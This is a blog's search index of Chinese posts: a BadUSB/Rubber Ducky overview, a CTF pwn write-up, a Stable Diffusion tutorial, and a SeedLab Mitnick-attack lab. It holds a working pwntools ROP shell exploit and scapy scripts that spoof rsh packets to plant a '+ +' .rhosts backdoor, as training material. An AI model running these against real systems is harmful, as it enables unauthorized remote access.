<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BadUSB的前世今生：USB RUBBER DUCKY和Teensy USB</title>
    <url>/posts/30b50265.html</url>
    <content><![CDATA[<p>本文转载自[BadUSB的前世今生：USB RUBBER DUCKY和Teensy USB](<a href="https://cloud.tencent.com/developer/article/1036206">BadUSB的前世今生：USB RUBBER DUCKY和Teensy USB - 腾讯云开发者社区-腾讯云 (tencent.com)</a>)</p>
<p><strong>一、介绍</strong></p>
<p>前段时间翻译了有关BadUSB的两篇文章《解密BadUSB：世界上最邪恶的USB外设》和《研究人员公布BadUSB攻击测试（exploit）代码》，大家反应强烈，很多人都在打听BadUSB的实现方法，或者从那里可以买到这样的U盘。原本打算本周写一篇分析已公开的BadUSB利用代码，兑现一下诺言，但实在是抽不出时间。在此先给大家介绍一下BadUSB的“老前辈”：USB RUBBER DUCKY和Teensy，满足一下大家的好奇心。USB RUBBER DUCKY和Teensy都可用于实施HID模拟攻击，其中USB RUBBER DUCKY入手简单，傻瓜式操作，但价格不菲啊；而Teensy USB性价比比较高，也可用来制作各种酷炫的DIY。</p>
<p><strong>二、USB RUBBER DUCKY（USB 橡皮鸭）</strong></p>
<p><strong>1.介绍</strong></p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-1268449/ed4ijlzf2s.jpeg?imageView2/2/w/2560/h/7000" alt="img"></p>
<p>USB RUBBER DUCKY（USB 橡皮鸭）是最早的按键注入工具。自2010年以来，USB橡皮鸭就一直深受黑客、<a href="https://cloud.tencent.com/product/wpt?from=20065&from_column=20065">渗透测试</a>人员以及IT专家的欢迎。USB 橡皮鸭最初作为一个IT自动化概念验证（POC），通过嵌入式开发板实现的，后来它发展成为一个完全成熟的商业化按键注入攻击平台。USB橡皮鸭通过简单的脚本语言、强大的硬件以及出色的伪装成功俘获了黑客的“芳心”。（谁能想到这么可爱的大黄鸭）</p>
<p>不管是笔记本、台式机、平板以及智能手机，几乎每个计算机都通过键盘获得输入。这就是为什么会有一个无处不在的USB标准HID或人机接口设备（Human Interface Device）。任何一个宣称是键盘HID的设备都能够被大多数操作系统自动的探测和接入。不管它是Windows、Mac或安卓设备，键盘就是老大。</p>
<p><strong>Freebuf小科普</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable constant_">HID</span>（<span class="title class_">Human</span> <span class="title class_">Interface</span> <span class="title class_">Device</span>）人机接口设备类别是<span class="title class_">Windows</span>最早支持的<span class="variable constant_">USB</span>类别。由其名称可以了解<span class="variable constant_">HID</span>设备是计算机直接</span><br><span class="line">与人交互的设备，例如键盘、鼠标和游戏杆等。不过<span class="variable constant_">HID</span>设备不一定要有人机接口，只要符合<span class="variable constant_">HID</span>类别规范，就都是<span class="variable constant_">HID</span>设备。</span><br></pre></td></tr></table></figure>

<p>复制</p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-1268449/shli98ytmx.jpeg?imageView2/2/w/2560/h/7000" alt="img"></p>
<p>USB橡皮鸭的名字和背后的原理都源自美国一句俗语“ If it looks like a duck,quacks like a duck and walks like a duck,it’s a duck”（意思就是如果走路和叫声都像鸭子,那就是鸭子）。人类使用键盘，而计算机相信人类，进而推论出计算机相信键盘。结合计算机对键盘的固有信任和速度超过1000字&#x2F;分钟的通过脚本模拟的按键操作，传统的安全对策都能够被USB橡皮鸭轻易的绕过，即<strong>HID模拟攻击</strong>。</p>
<p><strong>2.特点</strong></p>
<p><strong>1).简单易用的脚本语言</strong></p>
<p>USB 橡皮鸭所使用的脚本语言Duckyscript简单易用，编写payload并不需要任何编程经验。而且现支持在线定制Payload：<a href="http://www.ducktoolkit.com/Home.jsp%E3%80%82%E5%8F%AA%E9%9C%80%E8%A6%81%E7%AE%80%E5%8D%95%E7%9A%84%E4%B8%89%E4%B8%AA%E6%AD%A5%E9%AA%A4%EF%BC%8C%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%88%9B%E5%BB%BA%E5%8A%9F%E8%83%BD%E5%BC%BA%E5%A4%A7%E7%9A%84Payload%EF%BC%9A">http://www.ducktoolkit.com/Home.jsp。只需要简单的三个步骤，就可以创建功能强大的Payload：</a></p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-1268449/b04ikzq8e6.jpeg?imageView2/2/w/2560/h/7000" alt="img"></p>
<p>USB 橡皮鸭已有的Payload模块如下表所示：</p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-1268449/wfj19szsx9.jpeg?imageView2/2/w/2560/h/7000" alt="img"></p>
<p><strong>2).功能强大的定制硬件</strong></p>
<p>USB 橡皮鸭使用自定制的硬件设备，具有更大的处理能力和功能性多样化，硬件当然是收费的——39.99$。</p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-1268449/kym8q93sqw.jpeg?imageView2/2/w/2560/h/7000" alt="img"></p>
<p>硬件特点：</p>
<p>①快速的60MHZ 32位处理器</p>
<p>②便捷的Type A USB连接器</p>
<p>③可通过Micro SD卡扩展内存</p>
<p>④隐藏在不起眼的外壳中</p>
<p>⑤内置载荷重按钮</p>
<p><strong>3).跨平台特性</strong></p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-1268449/qrbeq5wvtg.jpeg?imageView2/2/w/2560/h/7000" alt="img"></p>
<p>不管是Windows、Linux、Mac还是Android（当然是不算触摸屏了），各个系统平台所遵守的USB标准都是一致的。所以USB RUBBER DUCKY自然而然就具有了跨平台的特点。</p>
<p><strong>4).活跃的交流社区</strong></p>
<p>USB RUBBER DUCKY拥有自己社区版固件、编码器以及工具箱，具有良好的交流沟通平台：</p>
<p><a href="https://forums.hak5.org/index.php?/forum/56-usb-rubber-ducky/">https://forums.hak5.org/index.php?/forum/56-usb-rubber-ducky/</a></p>
<p><strong>3.攻击测试步骤</strong></p>
<p>①下载网站生成的inject.bin载荷文件；</p>
<p>②把文件microSD卡的根目录；</p>
<p>③把microSD卡插入到USB橡皮鸭</p>
<p>④在USB橡皮鸭插入到目标系统中</p>
<p>⑤当看到命令提示窗口时，移除USB橡皮鸭；</p>
<p><strong>三、Teensy USB</strong></p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-1268449/ai7k06jlz9.jpeg?imageView2/2/w/2560/h/7000" alt="img"></p>
<p>Teensy是一套完整的基于USB微控制器的开发系统，在占用极少资源的情况下可以实现多种多样的项目。所有的编程都是通过USB端口进行的。不需要特殊的编程器，只需要一个标准的Mini-B USB线缆、一台带有USB口的PC机或Macintosh机。</p>
<p><strong>主要特点</strong>：</p>
<p>①可以变身为任意类型的设备</p>
<p>②AVR处理器，16 MHz</p>
<p>③单按钮编程</p>
<p>④易于使用的Teensy Loader应用程序</p>
<p>⑤免费软件开发工具</p>
<p>⑥兼容Mac OS X，Linux和Windows</p>
<p>⑦便携,许多项目的完美支持</p>
<p>⑧使用标签面包板</p>
<p>⑨非常低的成本</p>
<p>你可能问我Teensy能干什么？我会说，你应该问我Teensy不能干什么！，装X必备的神器之一。</p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-1268449/ldd1fn950p.jpeg?imageView2/2/w/2560/h/7000" alt="img"></p>
<p>关于Teensy如何实现HID模拟攻击，我就不贴具体内容了，详情大家可以查看一下文章：</p>
<ol>
<li>一个U盘黑掉你：HID攻击之TEENSY实战</li>
<li><a href="http://sec.chinabyte.com/410/13056910.shtml">http://sec.chinabyte.com/410/13056910.shtml</a></li>
<li></li>
<li>Teensy HID新型攻击方式（Kautilya渗透测试套件）</li>
</ol>
<p><strong><a href="http://www.xocoder.com/archives/1328">http://www.xocoder.com/archives/1328</a></strong> </p>
<p><strong>四、总结</strong></p>
<p>HID（Human Interface Devices）攻击当前不流行，但是攻击方式很新颖，实用性很高，危险系数应该还是比较高的，值得研究。BadUSB公布的利用代码借鉴了以上两个项目中的一些思路，但这两个项目和BadUSB还是有比较大的区别：</p>
<p>①USB RUBBER DUCKY和Teensy都需要定制的硬件设备，通用性差，而BadUSB针对的是通用的USB设备；</p>
<p>②USB RUBBER DUCKY和Teensy不能够自动复制传播，仅实现了从USB设备-&gt;计算机的单向感染途径，缺少计算机-&gt;USB设备的感染途径，仅适用于定点攻击（Targeted attack），危害程度大大削弱；</p>
<p>③USB RUBBER DUCKY和Teensy可以实现HID模拟攻击，尚未实现插入恶意代码的功能；</p>
<p><strong>参考链接：</strong></p>
<p><strong>1.USB Rubber Ducky主页：<a href="http://192.64.85.110/index.php">http://192.64.85.110/index.php</a></strong></p>
<p><strong>2.Teensy USB Development Board：<a href="http://www.pjrc.com/teensy/">http://www.pjrc.com/teensy/</a></strong></p>
<p><strong>3.一个U盘黑掉你：HID攻击之TEENSY实战：<a href="http://sec.chinabyte.com/410/13056910.shtml">http://sec.chinabyte.com/410/13056910.shtml</a></strong></p>
<p><strong>4.Teensy HID新型攻击方式（Kautilya渗透测试套件）<a href="http://www.xocoder.com/archives/1328">http://www.xocoder.com/archives/1328</a></strong></p>
<p><strong>[原文作者Rabbit_Run，喜欢文章请点赞鼓励。转载请注明来自FreeBuf.COM。免责声明：以上介绍的技术仅作为测试验证目的]</strong></p>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>鼠标右键添加新建md文档</title>
    <url>/posts/feb04467.html</url>
    <content><![CDATA[<p>直接上链接：</p>
<p><a href="%5B(36%E6%9D%A1%E6%B6%88%E6%81%AF">鼠标右键添加新建.md文档（亲测有效）</a> Windows下右键新建.md文件教程（转）_右键新建md文件_MercyDean的博客-CSDN博客](<a href="https://blog.csdn.net/qq_43564374/article/details/109471694">https://blog.csdn.net/qq_43564374/article/details/109471694</a>))</p>
]]></content>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn_2019_c_1 WriteUp</title>
    <url>/posts/daa10577.html</url>
    <content><![CDATA[<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul>
<li>libc版本泄漏</li>
<li>ROP攻击</li>
<li>onegadget使用</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ol>
<li>使用<code>checksec</code>工具进行查看，程序为64位，NX保护</li>
</ol>
<img src="/posts/daa10577/checksec.png" class="" title="checksec">

<ol start="2">
<li>使用ida工具反编译。</li>
</ol>
<p><code>main</code>:</p>
<img src="/posts/daa10577/main.png" class="" title="main">

<p><code>encrypt</code>：</p>
<img src="/posts/daa10577/encrypt.png" class="" title="encrypt">

<p>​		可以看出程序功能为对输入字符串进行加密，而加密<code>encrypt</code>函数中的get存在栈溢出漏洞。</p>
<ol start="3">
<li>由于在程序中找不到<code>system</code>函数和<code>/bin/sh</code>字符串，所以需要进行ROP攻击，泄漏其libc地址，使用onegadget工具直接获取shell。</li>
<li>使用ROPgadget工具获取泄漏libc地址所需的指令地址(<code>pop rdi</code>; )，然后获取程序中put_got表和put_plt表地址，执行栈溢出payload构造如下</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = flat(<span class="string">b&quot;\0&quot;</span>, <span class="string">b&quot;a&quot;</span>*(<span class="number">0x50</span>-<span class="number">1</span>), <span class="number">0x0</span>, pop_rdi, puts_got, puts_plt, encrypt)</span><br></pre></td></tr></table></figure>

<p>​		注意最后需要加上encrypt函数使程序重新回到漏洞函数处。</p>
<ol start="5">
<li>获取libc基址后，再次进入漏洞函数，然后执行onegadget指令。获取shell。</li>
</ol>
<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><strong>构造脚本如下</strong></p>
<p><code>python</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./ciscn_2019_c_1&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26936</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = <span class="number">0x10a38c</span>  <span class="comment"># 0x4f322, 0x4f2c5, 0x10a38c</span></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">encrypt = <span class="number">0x4009A0</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">puts_offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&quot;\0&quot;</span>, <span class="string">b&quot;a&quot;</span>*(<span class="number">0x50</span>-<span class="number">1</span>), <span class="number">0x0</span>, pop_rdi, puts_got, puts_plt, encrypt)</span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x4009DD&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Input your choice!&quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\nCiphertext\n\n&quot;</span>)</span><br><span class="line">puts_addr = p.recv(<span class="number">6</span>)</span><br><span class="line">puts_addr = u64(puts_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_addr = puts_addr - puts_offset</span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">one_gadget = libc_addr + one_gadget</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&quot;\0&quot;</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>), <span class="number">0x0</span>, one_gadget)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Input your Plaintext to be encrypted&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>成功获取flag</p>
<img src="/posts/daa10577/result.png" class="" title="result">
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>AI绘图工具以及使用教程</title>
    <url>/posts/75b509d1.html</url>
    <content><![CDATA[<h2 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h2><p>先放一下结果吧，本人机器只有GTX1650，所以生成的图片质量以及分辨率十分有限~</p>
<p><img src="https://img.xhacgn.com/images/2023/04/20/00001-1891544376.png" alt="00001-1891544376.png"></p>
<p><img src="https://img.xhacgn.com/images/2023/04/20/00005-1891544376.png" alt="00005-1891544376.png"></p>
<p><img src="https://img.xhacgn.com/images/2023/04/20/00009-2832915632.png" alt="00009-2832915632.png"></p>
<p><img src="https://img.xhacgn.com/images/2023/04/20/00036-3604192810.png" alt="00036-3604192810.png"></p>
<p><img src="https://img.xhacgn.com/images/2023/04/20/00050-4188726228.png" alt="00050-4188726228.png"></p>
<p><img src="https://img.xhacgn.com/images/2023/04/20/00066-114514.png" alt="00066-114514.png"></p>
<p><img src="https://img.xhacgn.com/images/2023/04/20/00069-1234567891f55fa507eb30f6a.png" alt="00069-1234567891f55fa507eb30f6a.png"></p>
<p>大概就是这样，模型可以在<a href="https://civitai.com/">civatai</a>（需魔法）和[Hugging Face](<a href="https://huggingface.co/">Hugging Face – The AI community building the future.</a>)中找。</p>
<h2 id="stable-diffusion-webui工具安装"><a href="#stable-diffusion-webui工具安装" class="headerlink" title="stable-diffusion-webui工具安装"></a>stable-diffusion-webui工具安装</h2><p>[stable-diffusion官网](<a href="https://github.com/AUTOMATIC1111/stable-diffusion-webui">AUTOMATIC1111&#x2F;stable-diffusion-webui: Stable Diffusion web UI (github.com)</a>)在这里，可以参照里面的Readme文档指示进行安装。环境Windows，Linux皆可，python版本最好是3.10（否则可能有一些包会安装失败），无需手动安装pytorch，官方Readme文档里有提到点击运行webui-user.bat（Windows系统，后面都是以windows系统为例）即可自动安装相应包体组件。另外一点需要注意，如果你想要使用python虚拟环境，例如conda，可以编辑webui-user.bat中PYTHON的地址为你的conda环境python地址。</p>
<p>在运行webui-user.bat之前，你需要先下载模型放到指定位置，这里推荐几个模型作为示例，</p>
<ul>
<li><a href="%5Bcivitai.com%5D(https://civitai.com/models/4468/counterfeit-v25)">counterfeit-v25</a>(需魔法）：下载得到.safesensor文件放入\stable-diffusion-webui-master\models\Stable-diffusion路径下。这个文件夹下必须至少有一个模型文件，.safesensor, .ckpt文件皆可。</li>
</ul>
<p>下面是几个模型文件例子，可以自行百度查找。<img src="https://img.xhacgn.com/images/2023/04/20/a40c51e8c197fdf4871351c6e6868664.png" alt="a40c51e8c197fdf4871351c6e6868664.png"></p>
<p>然后就可以直接点击运行webui-user.bat文件，运行过程中如果出现报错，请确认你的python版本正确（一般命令行报错信息会提示你），然后如果显示安装失败，那么大概率是网络问题，请检查你的网络配置，代理是否开启，然后关闭命令行重新运行。</p>
<p>安装好后，就可以按照命令行提示打开<a href="http://127.0.0.1:7860/%E7%84%B6%E5%90%8E%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%BE%93%E5%85%A5prompts%E4%BB%A5%E5%8F%8A%E5%90%84%E7%A7%8D%E5%8F%82%E6%95%B0%E8%BF%9B%E8%A1%8CAI%E7%BB%98%E5%9B%BE%E4%BA%86%EF%BC%81%E5%BD%93%E7%84%B6%E4%B8%80%E5%AE%9A%E8%A6%81%E6%B3%A8%E6%84%8F%E8%87%AA%E5%B7%B1%E7%9A%84%E6%98%BE%E5%8D%A1%E9%85%8D%E7%BD%AE%EF%BC%8C%E4%BE%8B%E5%A6%82%E6%9C%AC%E4%BA%BA4GB%E6%98%BE%E5%AD%98%E5%B0%B1%E5%8F%AA%E8%83%BD%E7%94%BB%E5%A4%A7%E6%A6%82900x400%E8%BF%99%E4%B8%AA%E5%88%86%E8%BE%A8%E7%8E%87%EF%BC%88%E5%8B%BE%E9%80%89hires.fix%E5%8F%82%E6%95%B0%E5%90%8E%EF%BC%89%EF%BC%8C%E4%B8%8D%E5%8B%BE%E9%80%89%E7%9A%84%E8%AF%9D%E6%9C%80%E5%A4%A7%E4%B9%9F%E5%B0%B1512x512">http://127.0.0.1:7860/然后就可以输入prompts以及各种参数进行AI绘图了！当然一定要注意自己的显卡配置，例如本人4GB显存就只能画大概900x400这个分辨率（勾选hires.fix参数后），不勾选的话最大也就512x512</a>~</p>
<h2 id="stable-diffusion-web-ui简要介绍"><a href="#stable-diffusion-web-ui简要介绍" class="headerlink" title="stable diffusion web ui简要介绍"></a>stable diffusion web ui简要介绍</h2><p><img src="https://img.xhacgn.com/images/2023/04/20/screenshot.png" alt="screenshot.png"></p>
<ul>
<li>stable diffusion checkpoint：你下载的模型，包含在上面提到的文件夹下的所有模型文件，可以选择任何一个模型进行加载。</li>
<li>Prompts：提示词，AI会根据该提示词进行绘制</li>
<li>Negative Prompts：负面提示词，AI会尽量避免里面的关键词</li>
<li>Sampling method：数据采样方式，没什么大影响</li>
<li>Sampling steps：采样步数，20-50就可以了，当然你再多一些也没关系，就是运行时间会久一些，还没试过效果会不会有明显改善</li>
<li><strong>Restore faces：</strong>在图象生成后再对面部进行优化，<strong>十分重要！！！</strong></li>
<li><strong>Hires.fix：</strong>可以将本来较小分辨率的图片再扩展成较大分辨率的图片</li>
<li>Batch Count：训练几张图片，串行生成</li>
<li>Batch Size：一次训练几张图片，并行生成</li>
<li>CFG Scale：AI绘图对Prompt的倾向性有多强。</li>
<li>Seed：种子，你可以按照我的世界的地图种子来理解。</li>
</ul>
<p>可以在<a href="https://civitai.com/">civatai</a>网站中找到自己喜欢的图片，里面会有相应的Prompts等参数，一般而言参数一模一样的话，产生的图也会比较相似。</p>
<p>下面给一个通用Prompts，用于画二次元少女图的</p>
<p>Prompt：masterpiece，beat quality，1girl</p>
<p>Negative Prompt：nsfw,blush,lowres, bad anatomy, bad hands, text, error, missing fingers, extra digit, fewer digits, cropped, worst quality, low quality, normal quality, jpeg artifacts,signature, watermark, username, blurry, artist name,bad feet,big head,fused body,multiple hands,multiple legs,multiple hands,multiple breast,multiple lower legs,multiple thighs,fused body,twist body</p>
<p>其他参数自己调就可以了。（只要不太过分都是没问题的~~~）</p>
]]></content>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>【SeedLab】MITNICK攻击实验</title>
    <url>/posts/7fdadce9.html</url>
    <content><![CDATA[<h2 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h2><p>KEVIN·MITNICK可能是美国最著名的黑客之一，他在联邦调查局的通缉犯名单上。在逃亡期间，他开始对破解移动网络产生了兴趣，并需要专门的软件来帮助他做到这一点。这让他找到了圣地亚哥超级计算机中心的研究员TSUTOMU SHIMOMURA，移动电话网络安全方面的主要研究人员之一。他有MITNICK想要的代码。</p>
<p>1994年，MITNICK利用TCP协议中的漏洞和SHIMOMURA的两台计算机之间的受信任关系，成功地对SHIMOMURA的计算机发动了一次攻击。这次袭击引发了两人之间的对决，并最终导致了MITNICK的被捕。这场对决后来被演变成书籍和好莱坞电影。这次攻击现在被称为MITNICK攻击，这是一种特殊类型的TCP会话劫持。</p>
<h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>这个实验的目的是重现经典的MITNICK攻击，这样学生们就可以获得这种攻击的第一手经验。我们将模拟最初在SHIMOMURA电脑上的设置，然后启动MITNICK攻击，在SHIMOMURA的两台电脑之间创建一个伪造的TCP会话。如果攻击成功了，我们应该能够在SHIMOMURA的计算机上运行任何命令</p>
<h2 id="实验主题"><a href="#实验主题" class="headerlink" title="实验主题"></a>实验主题</h2><ul>
<li><p>TCP会话劫持攻击</p>
</li>
<li><p>TCP三次握手协议</p>
</li>
<li><p>MITNICK攻击</p>
</li>
<li><p>远程SHELL RSH</p>
</li>
<li><p>数据包嗅探与伪造</p>
</li>
</ul>
<h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><h4 id="1-使用docker容器建立实验环境"><a href="#1-使用docker容器建立实验环境" class="headerlink" title="1. 使用docker容器建立实验环境"></a>1. 使用docker容器建立实验环境</h4><p>在网站<a href="http://202.120.1.66:1068/">Home</a>下载相关的环境安装包，然后再Ubuntu系统中打开。使用命令<code>docker-compose up</code>完成环境搭建以及容器启动。</p>
<img src="/posts/7fdadce9/environment.png" class="" title="environment">

<h4 id="2-配置X-Terminal"><a href="#2-配置X-Terminal" class="headerlink" title="2. 配置X-Terminal"></a>2. 配置X-Terminal</h4><p>使用<code>docker exec -it [container-ID] /bin/bash</code>命令进入<code>x-terminal</code>主机，创建.rhost文件，添加<code>trust_server</code>主机IP地址</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su seed</span><br><span class="line">cd ~</span><br><span class="line">touch .rhosts</span><br><span class="line">echo 10.9.0.6 &gt; .rhosts</span><br><span class="line">chmod 644 .rhosts</span><br></pre></td></tr></table></figure>

<img src="/posts/7fdadce9/x_terminal_rsh_config.png" class="" title="x_terminal_rsh_config">

<p>配置完成后，使用<code>Trust Server</code>主机进行<code>rsh</code>登录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su seed</span><br><span class="line">rsh 10.9.0.5 date</span><br></pre></td></tr></table></figure>

 <img src="/posts/7fdadce9/x_terminal_rsh_config_verify.png" class="" title="x_terminal_rsh_config_verify">

<p>另外还需要设置<code>arp</code>长期缓存，因为如果在进行<code>mitnick</code>攻击时，如果<code>X-Terminal</code>主机中没有<code>Trust Server</code>主机的<code>arp</code>缓存，<code>X-Terminal</code>会发出<code>arp</code>报文请求<code>Trust Server</code>MAC地址，然而<code>Trust Server</code>由于收到<code>SYN FLOODING</code>攻击无法给予回复，导致攻击无法继续向下进行。</p>
<h4 id="3-模拟SYN-FLOODING攻击"><a href="#3-模拟SYN-FLOODING攻击" class="headerlink" title="3. 模拟SYN FLOODING攻击"></a>3. 模拟SYN FLOODING攻击</h4><p>由于当前主机都可以很好的防护SYN FLOODING攻击，可以直接关闭<code>Trust Server</code>主机来模拟SYN FLOODING攻击成功。</p>
<h4 id="4-建立第一个TCP连接——伪造SYN包"><a href="#4-建立第一个TCP连接——伪造SYN包" class="headerlink" title="4. 建立第一个TCP连接——伪造SYN包"></a>4. 建立第一个TCP连接——伪造SYN包</h4><p>令<code>Trust Server</code>主机rsh远程登录<code>X-Terminal</code>主机，tcpdump查看包交互过程，如下图，可见<code>10.9.0.5</code>与<code>10.9.0.6</code>之间建立了两次TCP连接（<code>10.9.0.5:514 &lt;-&gt; 10.9.0.6:1023</code>, <code>10.9.0.5:1023 &lt;-&gt; 10.9.0.6:1022</code>）</p>
<img src="/posts/7fdadce9/tcp_dump.png" class="" title="tcp_dump">

<p><code>mitnick</code>攻击实验进行TCP连接过程如下图：</p>
<img src="/posts/7fdadce9/TCP.png" class="" title="TCP">



<p>使用<code>python scapy</code>库构造脚本，伪造SYN包，向<code>X-Terminal</code>伪造<code>Trust Server</code>发送SYN包，尝试建立连接。</p>
<p><code>python</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.发送第一个SYN包</span></span><br><span class="line">ip = IP(src=<span class="string">&quot;10.9.0.6&quot;</span>, dst=<span class="string">&quot;10.9.0.5&quot;</span>)</span><br><span class="line">tcp = TCP(sport=<span class="number">1023</span>, dport=<span class="number">514</span>)</span><br><span class="line">tcp.flags = <span class="string">&quot;S&quot;</span></span><br><span class="line">p = ip / tcp</span><br><span class="line">send(p, verbose=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>构造ip头以及tcp，注意tcp源端口需要为”1023”，标志位需要为”S”，向<code>X-Terminal</code>主机发送SYN包。</p>
<h4 id="5-建立第一个TCP连接——伪造SYN-ACK响应包"><a href="#5-建立第一个TCP连接——伪造SYN-ACK响应包" class="headerlink" title="5. 建立第一个TCP连接——伪造SYN-ACK响应包"></a>5. 建立第一个TCP连接——伪造SYN-ACK响应包</h4><p>发送SYN包后，<code>X-Terminal</code>会发送SYN+ACK响应包，<code>Attacker</code>主机需要伪造ACK响应包回复。其中包含了 ip, tcp, data等信息，data数据中包含了<code>touch /home/seed/xyz</code>命令。</p>
<p><code>python</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.伪造SYN+ACK响应包</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="keyword">if</span> pkt[TCP].flags == <span class="string">&quot;SA&quot;</span> <span class="keyword">and</span> pkt[IP].src == <span class="string">&quot;10.9.0.5&quot;</span>:</span><br><span class="line">        old_ip = pkt[IP]</span><br><span class="line">        old_tcp = pkt[TCP]</span><br><span class="line">        tcp_len = old_ip.<span class="built_in">len</span> - old_ip.ihl * <span class="number">4</span> - old_tcp.dataofs * <span class="number">4</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;:&#123;&#125; -&gt; &#123;&#125;:&#123;&#125; Flags=&#123;&#125; Len=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(old_ip.src, old_tcp.sport, old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))</span><br><span class="line"></span><br><span class="line">        ip = IP(src=<span class="string">&quot;10.9.0.6&quot;</span>, dst=<span class="string">&quot;10.9.0.5&quot;</span>)</span><br><span class="line">        tcp = TCP(sport=<span class="number">1023</span>, dport=pkt[TCP].sport)</span><br><span class="line">        tcp.flags = <span class="string">&quot;A&quot;</span></span><br><span class="line">        tcp.seq = pkt[TCP].ack</span><br><span class="line">        tcp.ack = pkt[TCP].seq + <span class="number">1</span></span><br><span class="line">        <span class="comment"># 伪造rsh数据包</span></span><br><span class="line">        data = <span class="string">&quot;9090\x00seed\x00seed\x00echo + + &gt; /home/seed/.rhosts\x00&quot;</span></span><br><span class="line">        p = ip / tcp / data</span><br><span class="line">        send(p, verbose=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">myFilter = <span class="string">&#x27;tcp&#x27;</span>  <span class="comment"># You need to make the filter more specific</span></span><br><span class="line">sniff(iface=<span class="string">&#x27;br-ac4a3b4d5a3d&#x27;</span>, <span class="built_in">filter</span>=myFilter, prn=spoof)</span><br></pre></td></tr></table></figure>

<p>进行sniff嗅探<code>X-Terminal</code>主机发送的SYN+ACK包，根据该包构造ip头和tcp头，设置标志位为”A”表示ACK包，注ack序号应为SYN+ACK包的<code>seq+1</code>，并添加rsh data数据段，添加命令，命令格式为<code>[port_number]\x00[uid_client]\x00[uid_server]\x00[your command]\x00</code>  。</p>
<p>数据包括四个部分：一个端口号、 一个客户端的用户ID、 一个服务器的用户ID和一个命令。该端口号将用于第二个连接。 客户端和服务器的用户ID在本实验中都为”seed” 。 这四个字段用一个字节0分隔。</p>
